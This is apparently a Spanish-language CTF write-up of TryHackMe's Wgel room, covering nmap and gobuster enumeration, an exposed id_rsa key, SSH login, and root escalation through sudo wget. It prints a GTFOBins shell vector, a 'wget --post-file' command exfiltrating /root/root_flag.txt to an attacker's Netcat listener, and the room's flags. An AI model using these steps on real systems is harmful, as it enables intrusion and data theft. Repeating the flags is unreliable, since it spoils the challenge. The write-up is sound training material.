<h1 align="center">🫠 Wgel CTF — Writeup Completo</h1>

<p align="center">
  <img src="https://img.shields.io/badge/Plataforma-TryHackMe-red?logo=tryhackme&logoColor=white" alt="TryHackMe">
  <img src="https://img.shields.io/badge/Dificultad-Easy-brightgreen.svg" alt="Easy">
  <img src="https://img.shields.io/badge/OS-Linux-informational?logo=linux&logoColor=white" alt="Linux">
  <img src="https://img.shields.io/badge/Módulo-Hacking%20Ético-darkred.svg?logo=hackthebox&logoColor=white" alt="Hacking Ético">
  <img src="https://img.shields.io/badge/Grado-Máster%20en%20Ciberseguridad-gold.svg" alt="Máster Ciberseguridad">
</p>

<p align="center">
  <i>Memoria de operación ofensiva sobre la room Wgel CTF de TryHackMe. Enumeración web tenaz en múltiples iteraciones, exfiltración de clave privada RSA expuesta al público, dominación del entorno SSH y escalada de privilegios a través de un inteligente abuso del binario wget (con sudo sin contraseña) tras adaptar y descartar vectores inválidos de GTFOBins.</i>
</p>

---

> [!WARNING]
> **Aviso Legal.** Este writeup ha sido elaborado exclusivamente con fines académicos en el contexto del **Máster en Ciberseguridad**. Las técnicas documentadas se han aplicado únicamente sobre infraestructura propia de TryHackMe bajo sus condiciones de uso. El autor declina toda responsabilidad por usos indebidos de la información recogida.

---

## 📑 Índice

1. [Resumen Ejecutivo](#-1-resumen-ejecutivo)
2. [Vectores de Ataque](#-2-vectores-de-ataque-owasp-y-mitre)
3. [Herramientas Utilizadas](#-3-herramientas-utilizadas)
4. [Fase 1 — El Terreno de Juego (Reconocimiento Nmap)](#-4-fase-1--el-terreno-de-juego-reconocimiento-nmap)
5. [Fase 2 — El Laberinto de Sitemap (Enumeración Web)](#-5-fase-2--el-laberinto-de-sitemap-enumeración-web)
6. [Fase 3 — Inspección Oculta y el Oro RSA (Ajuste de Fuzzing)](#-6-fase-3--inspección-oculta-y-el-oro-rsa-ajuste-de-fuzzing)
7. [Fase 4 — Identidad Revelada (Inspección HTML)](#-7-fase-4--identidad-revelada-inspección-html)
8. [Fase 5 — Acceso Total Inesperado (SSH)](#-8-fase-5--acceso-total-inesperado-ssh)
9. [Fase 6 — Bandera Nativa de Usuario](#-9-fase-6--bandera-nativa-de-usuario)
10. [Fase 7 — Restricciones y Fracasos (Evaluando Sudo y Wget)](#-10-fase-7--restricciones-y-fracasos-evaluando-sudo-y-wget)
11. [Fase 8 — Atacante al Rescate (Bypass con POST File)](#-11-fase-8--atacante-al-rescate-bypass-con-post-file)
12. [Flags Obtenidas](#-12-flags-obtenidas)
13. [Conclusión](#-13-conclusión)

---

## 📈 1. Resumen Ejecutivo

La room **Wgel CTF** exige persistencia en la enumeración y creatividad en la escalada. Empezamos con dos puertos abiertos —SSH y HTTP— y nada obvio en la superficie web. Tres iteraciones consecutivas de Gobuster con distintas wordlists y configuraciones desvelan finalmente un directorio `.ssh` expuesto públicamente, que contiene la clave privada RSA íntegra del administrador. Un comentario en el HTML raiz también expone el nombre del usuario (`jessie`). Con ambos datos se establece sesión SSH directa. La escalada de privilegios parte de `sudo -l`, que muestra que `jessie` puede ejecutar `wget` como root sin contraseña. El vector de escalada directo de GTFOBins falla en el entorno concreto, lo que obliga a replantear el abuso del binario. La solución es usar `--post-file` de `wget` para exfiltrar `/root/root_flag.txt` hacia un listener Netcat en el atacante: la flag llega por HTTP POST sin necesidad de elevar a una shell interactiva.

---

## 🎯 2. Vectores de Ataque (OWASP y MITRE)

- [x] **Sensitive Data Exposure:** Repositorio en directorio `.ssh` alojado inadvertidamente a merced de visualización cruda junto a la valiosísima llave privada RSA integral. *(OWASP A02:2021)*
- [x] **Information Disclosure:** Rastro en texto plano por un programador imprudente, regalando dentro del esqueleto web nativo (`index.html`) una mención y el uso explícito del encargado en jefe.
- [x] **Security Misconfiguration:** Falta total en las redirecciones predeterminadas de control o negación (`403 Forbidden`) sobre accesos vitales de red en subcarpetas ocultas. *(OWASP A05:2021)*
- [x] **Privilege Escalation (Sudo Abuse):** Malversación intencionada de permisos al permitir accionar `NOPASSWD` contra un binario capaz de sustraer o emitir archivos localizados (`/usr/bin/wget`). *(MITRE TA0004)*

---

## 🛠️ 3. Herramientas Utilizadas

| Herramienta | Propósito |
|:---|:---|
| `nmap` | Diagnóstico activo de la terminal descubriendo el 100% perimetral. |
| `gobuster` | Fuzzing dinámico a los directorios del host. |
| Navegador Web | Recolección limpia para escudriñar rastros visuales directos. |
| `ssh` | Utilidad pilar para aplicar el inicio inyectando a la vena las credenciales crudas. |
| `nc` | Emulador Netcat instanciado localmente recibiendo todo dato ciego proyectado a voluntad. |
| `GTFOBins` | Bibliografía documental por excelencia sobre vectores de desbordamiento en utilidades comunes (LoLBins). |

---

## 💻 4. Fase 1 — Reconocimiento Nmap

Verificación de conectividad y escaneo inicial `SYN Stealth` para mapear rápidamente los servicios expuestos:

```bash
sudo nmap -T4 -vvvv -sS 10.129.181.52
```

<p align="center">
  <img src="imagenes/nmap-ejecucion-cli.png" alt="Ejecución Nmap CLI"/>
</p>

Dos puertos activos: SSH en el 22 y HTTP en el 80 con Apache. Sin credenciales para SSH, el vector inicial es necesariamente la capa web.

<p align="center">
  <img src="imagenes/nmap-resultado-apacheport-80.png" alt="Puertos 80 Apache y 22 SSH activos"/>
</p>

<p align="center">
  <img src="imagenes/nmap-resultado-apacheport-80.png" alt="Resultado Nmap — Puerto 80 Apache y 22 SSH"/>
</p>

---

## 🌐 5. Fase 2 — Enumeración Web: El Laberinto de Sitemap

Primera ejecución de Gobuster con wordlist medium de DirBuster:

```bash
sudo gobuster dir -u http://10.129.181.52/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html
```

<p align="center">
  <img src="imagenes/gobuster-ejecucion-cli-1.png" alt="Gobuster — Primera ejecución CLI"/>
</p>

Localizo `/sitemap` (301). La página es una plantilla corporativa genérica. Lanzo un segundo pase de Gobuster sobre ese endpoint:

```bash
sudo gobuster dir -u http://10.129.181.52/sitemap -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50 -x php,txt,html
```

<p align="center">
  <img src="imagenes/gobuster-ejecucion-2.png" alt="Gobuster — Segunda ejecución sobre /sitemap"/>
</p>

Aparecen rutas de contenido (contacto, servicios, etc.). Las reviso manualmente. El formulario de contacto no presenta vectores explotables.

<p align="center">
  <img src="imagenes/gobuster-resultado-2.png" alt="Gobuster — Resultado 2: páginas HTML"/>
</p>

<p align="center">
  <img src="imagenes/contactus-localizado.png" alt="Formulario de contacto — sin vectores"/>
</p>

---

## 🔑 6. Fase 3 — Descubrimiento del Directorio .ssh

Con la wordlist `common.txt` de `dirb` sobre `/sitemap/` —más eficaz que las listas de DirBuster en este caso—:

```bash
gobuster dir -u http://10.129.157.148/sitemap/ -w /usr/share/wordlists/dirb/common.txt -t 50
```

El resultado es sorprendente: el servidor expone un directorio `.ssh` accesible públicamente por HTTP.

<p align="center">
  <img src="imagenes/gobuster-ejecucion-3ssh.png" alt="Gobuster — Tercera ejecución descubre .ssh"/>
</p>

El directorio no tiene restricciones de acceso. Dentro: `id_rsa` disponible en texto plano. La clave privada RSA del administrador del servidor expuesta sin ningún control de acceso.

<p align="center">
  <img src="imagenes/gobuster-resultado-3.png" alt="Gobuster — .ssh expuesto"/>
</p>

Se descarga la clave y se asegura localmente.

<p align="center">
  <img src="imagenes/clave-privada-hallada.png" alt="Clave privada RSA encontrada en .ssh"/>
</p>

---

## 🖥️ 7. Fase 4 — Identidad del Usuario: Inspección HTML

Con la clave RSA en mano, falta el nombre de usuario para el SSH. Revisión del código fuente del `index.html` de la página principal (`Ctrl+U`).

Un comentario en el HTML expone directamente el usuario que gestionó el servidor: `jessie`.

<p align="center">
  <img src="imagenes/index-analizado-usuario-jessie-comentario.png" alt="Comentario HTML exponiendo al usuario jessie"/>
</p>

---

## 🔐 8. Fase 5 — Acceso SSH

Con `jessie` confirmado y la clave RSA localmente asegurada:

```bash
chmod 600 id_rsa
ssh -i id_rsa jessie@10.129.157.148
```

<p align="center">
  <img src="imagenes/guardar-llave-permisos600.png" alt="chmod 600 sobre id_rsa"/>
</p>

Sesión SSH establecida sin contraseña. Control inicial del servidor obtenido.

<p align="center">
  <img src="imagenes/acceso-clave-sshpriv-jessie.png" alt="SSH como jessie con clave privada"/>
</p>

---

## 🏳️ 9. Fase 6 — Flag de Usuario

Listado del directorio `Documents/` del home de `jessie`:

```bash
ls -lah Documents/
cat Documents/user_flag.txt
```

Flag de usuario obtenida: `057c67131c3d5e42dd5cd3075b198ff6`.

<p align="center">
  <img src="imagenes/flag-usuario-estandar-hallada.png" alt="Flag de usuario"/>
</p>

---

## ⚡ 10. Fase 7 — Restricciones y Fracasos (Evaluando Sudo y Wget)

Al ejecutar `sudo -l`, se confirma que el usuario `jessie` puede ejecutar `/usr/bin/wget` con privilegios de superusuario sin necesidad de contraseña.

<p align="center">
  <img src="imagenes/wget-sudo-nopasswd-parajessie.png" alt="sudo -l — wget NOPASSWD"/>
</p>

Se intenta utilizar el vector de escalada de privilegios documentado en GTFOBins para obtener una shell interactiva:

```bash
echo -e '#!/bin/sh\n/bin/sh 1>&0' >/path/to/temp-file
chmod +x /path/to/temp-file
wget --use-askpass=/path/to/temp-file 0
```

<p align="center">
  <img src="imagenes/vulnerabilidad-shell-encontrada-gtfobins.png" alt="GTFOBins — wget shell exploit"/>
</p>

El vector de GTFOBins no resulta efectivo en este entorno, por lo que se requiere una alternativa para explotar la capacidad de `wget` de leer y transferir archivos con privilegios de root.

---

## 🏴 11. Fase 8 — Exfiltración con wget --post-file

Si GTFOBins no da shell interactiva en este caso, puedo explotar `wget` de otra forma: `--post-file` obliga a `wget` a leer un fichero local y enviarlo como cuerpo HTTP POST a cualquier receptor que yo controle. Ejecutándolo como root, puede leer ficheros que `jessie` no puede ver.

Levanto un listener Netcat en Kali:

```bash
nc -lvnp 80
```

Desde el SSH con `jessie`, lanzo la exfiltración:

```bash
sudo /usr/bin/wget --post-file=/root/root_flag.txt 192.168.132.194
```

<p align="center">
  <img src="imagenes/iniciando-wget-postfile.png" alt="wget --post-file enviando la flag de root"/>
</p>

El listener Netcat recibe la conexión HTTP POST y la flag de root aparece en el cuerpo de la petición.

<p align="center">
  <img src="imagenes/obtenida-flag-root-nclistener.png" alt="Flag root recibida por Netcat"/>
</p>

Room validado al 100% en TryHackMe.

<p align="center">
  <img src="imagenes/foto-room-copmpletada.png" alt="Wgel CTF completada"/>
</p>

---

## 🚩 12. Flags Obtenidas

| Nivel Operativo | Hash Visual Validado | Ruta de Almacenaje Base |
|:----:|:-----|:-----|
| 🏳️ **Usuario (User)** | `057c67131c3d5e42dd5cd3075b198ff6` | `/home/jessie/Documents/user_flag.txt` |
| 🏴 **Sistema (Root)** | `b1b968b37519ad1daa6408188649263d` | `/root/root_flag.txt` |

---

## ✅ 13. Conclusión

Wgel CTF documenta dos aprendizajes que van más allá de la técnica concreta.

**Enumeración:** La wordlist importa. Tres ejecuciones de Gobuster con configuraciones distintas antes de dar con el directorio `.ssh`. Cambiar de `directory-list-2.3-medium.txt` a `common.txt` fue la clave. Cuando la superficie parece limpia, el problema casi siempre es la wordlist, no la ausencia de vectores.

**Adaptación:** GTFOBins es una referencia excelente, no una garantía. El método de shell con `wget` falla en este entorno por incompatibilidades de versión. La solución pasa por entender qué hace el binario a nivel funcional —transferencia de ficheros con privilegios elevados— y explotar esa capacidad de una forma diferente: exfiltración por POST hacia un receptor controlado. Conocer la herramienta es más valioso que memorizar el GTFOBins.

### 📚 Bibliografía y Referencias

- [TryHackMe — Wgel CTF](https://tryhackme.com/room/wgelctf)
- [GTFOBins — wget](https://gtfobins.github.io/gtfobins/wget/)
- [Gobuster Enumeration](https://github.com/OJ/gobuster)
- [OWASP — Security Misconfiguration](https://owasp.org/Top10/)

---

<hr>
<p align="center">
  <i>Writeup elaborado como parte del módulo de Hacking Ético — Máster en Ciberseguridad.</i>
  <br><br>
  <b>Gabriel Godoy Alfaro</b>
</p>
